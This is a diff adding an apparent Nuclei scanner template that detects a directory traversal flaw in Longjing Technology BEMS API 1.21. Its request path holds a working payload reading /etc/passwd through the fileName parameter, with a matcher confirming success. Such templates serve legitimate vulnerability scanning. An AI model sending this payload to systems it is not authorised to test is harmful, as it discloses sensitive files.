@@ -1,0 +1,32 @@
+http:
+- matchers:
+  - regex:
+    - 'root:.*:0:0:'
+    type: regex
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/api/downloads?fileName=../../../../../../../../etc/passwd'
+id: bems-api-lfi
+info:
+  author: gy741
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  description: Longjing Technology BEMS API 1.21 is vulnerable to local file inclusion.
+    Input passed through the fileName parameter through the downloads API endpoint
+    is not properly verified before being used to download files. This can be exploited
+    to disclose the contents of arbitrary and sensitive files through directory traversal
+    attacks.
+  metadata:
+    max-request: 1
+  name: Longjing Technology BEMS API 1.21 - Local File Inclusion
+  reference:
+  - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5657.php
+  - https://packetstormsecurity.com/files/163702/
+  severity: high
+  tags: lfi,packetstorm
